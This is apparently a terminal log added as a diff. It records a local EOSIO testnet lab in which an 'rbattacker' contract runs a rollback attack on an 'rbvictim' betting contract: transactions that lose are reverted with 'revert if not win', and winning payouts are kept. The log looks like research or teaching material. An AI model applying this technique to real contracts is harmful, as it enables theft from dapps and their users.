@@ -1,0 +1,410 @@
+eosio@callisto:~/eos$ cleos create account eosio rbvictim EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+executed transaction: 91730c9099241be95128fed10a7c919eebdb4191158b694c2023ef9fee71c090  200 bytes  559 us
+#         eosio <= eosio::newaccount            {"creator":"eosio","name":"rbvictim","owner":{"threshold":1,"keys":[{"key":"EOS6MRyAjQq8ud7hVNYcfnVP...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio-cpp rbvictim/rbvictim.cpp -o rbvictim/rbvictim.wasm
+
+eosio@callisto:~/eos/contracts/rollback$ cleos set contract rbvictim ./rbvictim -p rbvictim@active
+Reading WASM from /home/eosio/eos/contracts/rollback/rbvictim/rbvictim.wasm...
+Publishing contract...
+executed transaction: 3002d5aeda22909f563e5dc402910ea6dd9f19fd3c244b67a2a25aeb3bc656a5  14416 bytes  5752 us
+#         eosio <= eosio::setcode               {"account":"rbvictim","vmtype":0,"vmversion":0,"code":"0061736d0100000001db012360000060037f7f7f017f6...
+#         eosio <= eosio::setabi                {"account":"rbvictim","abi":"0e656f73696f3a3a6162692f312e3200020474657374000005746573743100000200000...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim test '[]' -p rbvictim@active
+executed transaction: 71d6ba243e332dcb7b184a9db2ba30ca210980b78020372ed6e45a9a1e35ea22  96 bytes  445 us
+#      rbvictim <= rbvictim::test               ""
+>> test
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ eosio-cpp rbvictim/rbvictim.cpp -o rbvictim/rbvictim.wasm
+Warning, empty ricardian clause file
+Warning, empty ricardian clause file
+eosio@callisto:~/eos/contracts/rollback$ cleos set contract rbvictim ./rbvictim -p rbvictim@active
+Reading WASM from /home/eosio/eos/contracts/rollback/rbvictim/rbvictim.wasm...
+Skipping set abi because the new abi is the same as the existing abi
+Publishing contract...
+executed transaction: 4a998405568f60d0c389e8036bb9d78d7b064d6648056493947dc2ca2b39a186  14296 bytes  5227 us
+#         eosio <= eosio::setcode               {"account":"rbvictim","vmtype":0,"vmversion":0,"code":"0061736d0100000001d6012260000060037f7f7f017f6...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim test '[]' -p rbvictim@active
+executed transaction: 46ae7c70fcf0be8697b4d5977e7c1135a44fd9ce9603cd590949fada4ee34720  96 bytes  426 us
+#      rbvictim <= rbvictim::test               ""
+>> Unknown action
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim t '[]' -p rbvictim@active
+error 2023-03-27T09:26:42.566 cleos     main.cpp:4371                 operator()           ] Failed with error: Assert Exception (10)
+!action_type.empty(): Unknown action t in contract rbvictim
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim t1 '[]' -p rbvictim@active
+error 2023-03-27T09:27:12.692 cleos     main.cpp:4371                 operator()           ] Failed with error: Assert Exception (10)
+!action_type.empty(): Unknown action t1 in contract rbvictim
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim test '[]' -p rbvictim@active
+executed transaction: eff283ef149d6d9bd15c2523b5a71ed797e276bf75a24414c31b8941f2e98eef  96 bytes  320 us
+#      rbvictim <= rbvictim::test               ""
+>> test
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim t '[]' -p rbvictim@active
+error 2023-03-27T09:28:58.696 cleos     main.cpp:4371                 operator()           ] Failed with error: Assert Exception (10)
+!action_type.empty(): Unknown action t in contract rbvictim
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim test '[]' -p rbvictim@active
+executed transaction: d003e72a3f139070168e0f4ec8d4a8e661c5905a11d1380b4042932fa9adf464  96 bytes  312 us
+#      rbvictim <= rbvictim::test               ""
+>> test1
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbvictim test1 '[]' -p rbvictim@active
+executed transaction: a3edb4c0fd249eb87bb8a150f40965f7d8a52f1c5806b09d7306c12a5956a9d0  96 bytes  383 us
+#      rbvictim <= rbvictim::test1              ""
+>> test
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+
+eosio@callisto:~/eos/contracts$ git clone https://github.com/EOSIO/eosio.contracts --branch v1.7.0 --single-branch
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos create account eosio eosio.token EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+executed transaction: 538872bb328adea41ebc853df8b68ca2b430a352347b2609bff437da36c8655d  200 bytes  308 us
+#         eosio <= eosio::newaccount            {"creator":"eosio","name":"eosio.token","owner":{"threshold":1,"keys":[{"key":"EOS6MRyAjQq8ud7hVNYcf...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ eosio-cpp -I include -o eosio.token.wasm src/eosio.token.cpp --abigen
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos set contract eosio.token . --abi eosio.token.abi -p eosio.token@active
+Reading WASM from /home/eosio/eos/contracts/eosio.contracts/contracts/eosio.token/eosio.token.wasm...
+Publishing contract...
+executed transaction: 806307b9e91583ce56998d884dea568c2b684bddfb66569a22268610a8d18b8b  19368 bytes  6718 us
+#         eosio <= eosio::setcode               {"account":"eosio.token","vmtype":0,"vmversion":0,"code":"0061736d010000000180022860000060037f7f7f01...
+#         eosio <= eosio::setabi                {"account":"eosio.token","abi":"0e656f73696f3a3a6162692f312e320008076163636f756e7400010762616c616e63...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos push action eosio.token create '{"issuer":"rbvictim", "maximum_supply":"1000000000.0000 SYS"}' -p eosio.token@active
+executed transaction: d9dafd624633856a438c6ea870fc79058582a687564b55214a9c1c7df00f98fa  120 bytes  541 us
+#   eosio.token <= eosio.token::create          {"issuer":"rbvictim","maximum_supply":"1000000000.0000 SYS"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+#// The -d -j options indicate "don't broadcast" and "return the transaction as json", which you may find useful during development.
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos push action eosio.token issue '["rbvictim", "100.0000 SYS", "memo"]' -p rbvictim@active -d -j
+{
+  "expiration": "2023-03-27T09:58:53",
+  "ref_block_num": 19836,
+  "ref_block_prefix": 649614892,
+  "max_net_usage_words": 0,
+  "max_cpu_usage_ms": 0,
+  "delay_sec": 0,
+  "context_free_actions": [],
+  "actions": [{
+      "account": "eosio.token",
+      "name": "issue",
+      "authorization": [{
+          "actor": "rbvictim",
+          "permission": "active"
+        }
+      ],
+      "data": {
+        "to": "rbvictim",
+        "quantity": "100.0000 SYS",
+        "memo": "memo"
+      },
+      "hex_data": "000000d265e4f6b940420f00000000000453595300000000046d656d6f"
+    }
+  ],
+  "signatures": [
+    "SIG_K1_K1N7iF3mjMinrSVoGvY2hn2EM3n7zaKFgS9Zs99Vjh4ddqnFzMLUqAjXfL3J3YaxjwK5u3nLrycyF1PrAkYkkFER9C1Lnu"
+  ],
+  "context_free_data": []
+}
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos create account eosio rbattacker EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+executed transaction: 17aa0f78b77577e0c4029f74839b76de5d4e24ccfb225d72e80020fc271c9e1b  200 bytes  408 us
+#         eosio <= eosio::newaccount            {"creator":"eosio","name":"rbattacker","owner":{"threshold":1,"keys":[{"key":"EOS6MRyAjQq8ud7hVNYcfn...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio@callisto:~/eos/contracts/eosio.contracts/contracts/eosio.token$ cleos push action eosio.token issue '["rbattacker", "100.0000 SYS", "memo"]' -p rbvictim@active -d
+{
+  "expiration": "2023-03-27T10:03:15",
+  "ref_block_num": 20359,
+  "ref_block_prefix": 843270766,
+  "max_net_usage_words": 0,
+  "max_cpu_usage_ms": 0,
+  "delay_sec": 0,
+  "context_free_actions": [],
+  "actions": [{
+      "account": "eosio.token",
+      "name": "issue",
+      "authorization": [{
+          "actor": "rbvictim",
+          "permission": "active"
+        }
+      ],
+      "data": {
+        "to": "rbattacker",
+        "quantity": "100.0000 SYS",
+        "memo": "memo"
+      },
+      "hex_data": "00c05510999ccdb940420f00000000000453595300000000046d656d6f"
+    }
+  ],
+  "signatures": [
+    "SIG_K1_JzHA9GereqA3jBY2DGYevWgvrYuQ14g7JaaRVSQfxAD42rCAed59Q7nWynWvRc1ojr7Mym93pQiB6eoyvmSBN86EYKt898"
+  ],
+  "context_free_data": []
+}
+
+
+eosio@callisto:~/eos/contracts/rollback$ eosio-cpp rbattacker/rbattacker.cpp -o rbattacker/rbattacker.wasm
+Warning, empty ricardian clause file
+Warning, empty ricardian clause file
+Warning, action <test> does not have a ricardian contract
+Warning, action <test1> does not have a ricardian contract
+Warning, action <attack> does not have a ricardian contract
+eosio@callisto:~/eos/contracts/rollback$ cleos set contract rbattacker ./rbattacker -p rbattacker@active
+Reading WASM from /home/eosio/eos/contracts/rollback/rbattacker/rbattacker.wasm...
+Publishing contract...
+executed transaction: 2d89bf73a5401269014b5ed957e2874d2333b108a65b604dd518da305bdd7277  14800 bytes  5499 us
+#         eosio <= eosio::setcode               {"account":"rbattacker","vmtype":0,"vmversion":0,"code":"0061736d0100000001db012360000060037f7f7f017...
+#         eosio <= eosio::setabi                {"account":"rbattacker","abi":"0e656f73696f3a3a6162692f312e3200030661747461636b000004746573740000057...
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+Error 3050003: eosio_assert_message assertion failure
+Error Details:
+assertion failure with message: no balance object found
+pending console output: 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token issue '["rbvictim", "100.0000 SYS", "memo"]' -p rbvictim@active
+executed transaction: 35dc275b8f89b92c50711cf8dd89f607a429de525198d7e8369588b283ca7636  128 bytes  508 us
+#   eosio.token <= eosio.token::issue           {"to":"rbvictim","quantity":"100.0000 SYS","memo":"memo"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token issue '["rbattacker", "100.0000 SYS", "memo"]' -p rbvictim@active
+Error 3050003: eosio_assert_message assertion failure
+Error Details:
+assertion failure with message: tokens can only be issued to issuer account
+pending console output: 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token issue '["rbvictim", "100.0000 SYS", "memo"]' -p rbvictim@active
+executed transaction: cc1e84a155bd8901abe952a7ff98bbed7d071725685f4c87581ed40ae366fc19  128 bytes  412 us
+#   eosio.token <= eosio.token::issue           {"to":"rbvictim","quantity":"100.0000 SYS","memo":"memo"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbvictim", "rbattacker", "100.0000 SYS", "m" ]' -p rbvictim@active
+executed transaction: cebd79a842a99ab1d65243facd70c34af37ce54bc1a103cf9306816873c1d081  128 bytes  553 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"100.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"100.0000 SYS","memo":"m"}
+>> playing
+#    rbattacker <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"100.0000 SYS","memo":"m"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+executed transaction: 2ae59b0e98b0141d1135a121d2f7688eb4d05df007f862c833673004527173eb  128 bytes  525 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+>> playing
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+Error 3260000: Subjective exception thrown during block production
+Error Details:
+Authorization failure with inline action sent to self
+transaction declares authority '{"actor":"rbvictim","permission":"active"}', but does not have signatures for it under a provided delay of 0 ms, provided permissions [{"actor":"rbvictim","permission":"eosio.code"}], provided keys [], and a delay max limit of 3888000000 ms
+pending console output: received
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos get account rbvictim
+created: 2023-03-27T05:24:08.500
+permissions: 
+     owner     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+        active     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+memory: 
+     quota:       unlimited  used:     374.9 KiB  
+
+net bandwidth: 
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+cpu bandwidth:
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+eosio@callisto:~/eos/contracts/rollback$ cleos set account permission rbvictim active '{"threshold": 1, "keys": [{"key": "EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV", "weight": 1}], "accounts": [{"permission": {"actor": "rbvictim", "permission": "eosio.code"}, "weight": 1}]}' owner -p rbvictim@owner
+executed transaction: 8f3f9d77e5d3e379d2a77f1ba7779040322878dea2459276ced28dce5855bee0  184 bytes  436 us
+#         eosio <= eosio::updateauth            {"account":"rbvictim","permission":"active","parent":"owner","auth":{"threshold":1,"keys":[{"key":"E...
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+
+eosio@callisto:~/eos/contracts/rollback$ cleos get account rbvictim
+created: 2023-03-27T05:24:08.500
+permissions: 
+     owner     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+        active     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV, 1 rbvictim@eosio.code
+memory: 
+     quota:       unlimited  used:       375 KiB  
+
+net bandwidth: 
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+cpu bandwidth:
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+executed transaction: 29f7a280932fd2ca16ae8c70ee2f51a567b386806ef636f31d602bd72d666022  128 bytes  622 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+>> received
+#      rbvictim <= rbvictim::playing            ""
+>> Unknown action
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+executed transaction: 472d7d16d3f933a15c5690be8b4f19eff8f45e132d2d2e3ed0c3524d0be86042  128 bytes  718 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+>> received
+#      rbvictim <= rbvictim::playing            ""
+>> playing
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+executed transaction: 4bd30150c285d8742f658fb5ef5b3bcb57c9cef98f99b197cb34cec7945c41b4  128 bytes  740 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+>> received 1.0000 SYS from rbattacker
+#      rbvictim <= rbvictim::playing            {"from":"rbattacker","memo":"m"}
+>> playing
+#      rbvictim <= rbvictim::lose               ""
+>> lose
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "win" ]' -p rbattacker@active
+executed transaction: e79576396eaadd6170ab6d7bf2d2b924dc16be2fe3b69628e2d9b2f5dbe9dad5  128 bytes  619 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+>> received 1.0000 SYS from rbattacker
+#      rbvictim <= rbvictim::playing            {"from":"rbattacker","memo":"win"}
+>> playing
+#      rbvictim <= rbvictim::win                ""
+>> win
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "win" ]' -p rbattacker@active
+executed transaction: 450cb21a7d0c6649f45b35a11ee8faec2b88ba43721b0c1d189c9cab8630304b  128 bytes  791 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+>> received 1.0000 SYS from rbattacker
+#      rbvictim <= rbvictim::playing            {"from":"rbattacker","memo":"win"}
+>> playing
+#      rbvictim <= rbvictim::win                {"user":"rbattacker"}
+>> win
+#   eosio.token <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+>> sent 2.0000 SYS to rbattacker
+#    rbattacker <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+executed transaction: c5ce41414592dfa5867863f6ee2fa973c70a0a7a242f03f5bf5dd2f6f0b6fa29  128 bytes  751 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"m"}
+>> received 1.0000 SYS from rbattacker
+#      rbvictim <= rbvictim::playing            {"from":"rbattacker","memo":"m"}
+>> playing
+#      rbvictim <= rbvictim::lose               {"user":"rbattacker"}
+>> lose
+#   eosio.token <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"1.0000 SYS","memo":"you lose"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"1.0000 SYS","memo":"you lose"}
+>> sent 1.0000 SYS to rbattacker
+#    rbattacker <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"1.0000 SYS","memo":"you lose"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ]
+
+
+eosio@callisto:~/eos/contracts/rollback$ eosio-cpp rbattacker/rbattacker.cpp -o rbattacker/rbattacker.wasm
+Warning, empty ricardian clause file
+Warning, empty ricardian clause file
+Warning, action <attack> does not have a ricardian contract
+Warning, action <revert> does not have a ricardian contract
+eosio@callisto:~/eos/contracts/rollback$ cleos set contract rbattacker ./rbattacker -p rbattacker@active
+Reading WASM from /home/eosio/eos/contracts/rollback/rbattacker/rbattacker.wasm...
+Publishing contract...
+executed transaction: a7069ef9faaca6669e695c872af72946ffd5188f1970df325958d1307d349a08  19872 bytes  7035 us
+#         eosio <= eosio::setcode               {"account":"rbattacker","vmtype":0,"vmversion":0,"code":"0061736d0100000001eb012560000060037f7f7f017...
+#         eosio <= eosio::setabi                {"account":"rbattacker","abi":"0e656f73696f3a3a6162692f312e3200020661747461636b0001046d656d6f0673747...
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbattacker attack '["win"]' -p rbattacker@active
+Error 3090003: Provided keys, permissions, and delays do not satisfy declared authorizations
+Ensure that you have the related private keys inside your wallet and your wallet is unlocked.
+Error Details:
+transaction declares authority '{"actor":"rbattacker","permission":"active"}', but does not have signatures for it under a provided delay of 0 ms, provided permissions [{"actor":"rbattacker","permission":"eosio.code"}], provided keys [], and a delay max limit of 3888000000 ms
+pending console output: attack start
+eosio@callisto:~/eos/contracts/rollback$ cleos set account permission rbattacker active '{"threshold": 1, "keys": [{"key": "EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV", "weight": 1}], "accounts": [{"permission": {"actor": "rbattacker", "permission": "eosio.code"}, "weight": 1}]}' owner -p rbattacker@owner
+executed transaction: 5543b564896a3c636f256b6cb39653ac0cbc88b43bb72b7ddbdc498714c465dd  184 bytes  398 us
+#         eosio <= eosio::updateauth            {"account":"rbattacker","permission":"active","parent":"owner","auth":{"threshold":1,"keys":[{"key":...
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos get account rbattacker
+created: 2023-03-27T10:01:59.500
+permissions: 
+     owner     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
+        active     1:    1 EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV, 1 rbattacker@eosio.code
+memory: 
+     quota:       unlimited  used:     461.6 KiB  
+
+net bandwidth: 
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+cpu bandwidth:
+     used:               unlimited
+     available:          unlimited
+     limit:              unlimited
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action rbattacker attack '["win"]' -p rbattacker@active
+Error 3050003: eosio_assert_message assertion failure
+Error Details:
+assertion failure with message: datastream attempted to read past the end
+pending console output:
+
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "win" ]' -p rbattacker@active
+executed transaction: 5f933f4225b6e352a5593ae5c6e7d1d6d7d317877a27bf964120626d60d06d33  128 bytes  975 us
+#   eosio.token <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+#    rbattacker <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+>> rbattacker sent 1.0000 SYS to rbvictim
+#      rbvictim <= eosio.token::transfer        {"from":"rbattacker","to":"rbvictim","quantity":"1.0000 SYS","memo":"win"}
+>> rbattacker received 1.0000 SYS from rbattacker
+#      rbvictim <= rbvictim::playing            {"from":"rbattacker","memo":"win"}
+>> playing
+#      rbvictim <= rbvictim::win                {"user":"rbattacker"}
+>> win
+#   eosio.token <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+#      rbvictim <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+>> rbvictim sent 2.0000 SYS to rbattacker
+#    rbattacker <= eosio.token::transfer        {"from":"rbvictim","to":"rbattacker","quantity":"2.0000 SYS","memo":"you win"}
+>> rbattacker received 2.0000 SYS from rbvictim
+#    rbattacker <= rbattacker::revert           {"memo":"you win"}
+warning: transaction executed locally, but may not be confirmed by the network yet         ] 
+eosio@callisto:~/eos/contracts/rollback$ cleos push action eosio.token transfer '[ "rbattacker", "rbvictim", "1.0000 SYS", "m" ]' -p rbattacker@active
+Error 3050003: eosio_assert_message assertion failure
+Error Details:
+assertion failure with message: revert if not win
+pending console output:
+
